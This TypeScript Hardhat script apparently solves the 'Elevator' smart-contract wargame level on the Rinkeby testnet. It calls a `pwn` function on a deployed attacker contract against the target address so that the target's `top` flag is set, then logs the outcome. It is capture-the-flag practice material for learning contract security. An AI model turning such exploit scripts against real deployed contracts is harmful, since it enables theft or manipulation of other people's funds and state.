import { ethers } from "hardhat"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x1bfFf52e2a9634315D914e8A83C75697F424298e"
  const targetAbi = [
    {
      inputs: [],
      name: "floor",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x40695363",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "_floor",
          type: "uint256",
        },
      ],
      name: "goTo",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xed9a7134",
    },
    {
      inputs: [],
      name: "top",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xfe6dcdba",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Elevator")

  const tx = await contract.pwn(targetAddress, 11, { gasLimit: 100000 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://rinkeby.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log(`Count ${await contract.count()}`)
  console.log(`Top ${await target.top()}`)
  console.log(`Floor ${await target.floor()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
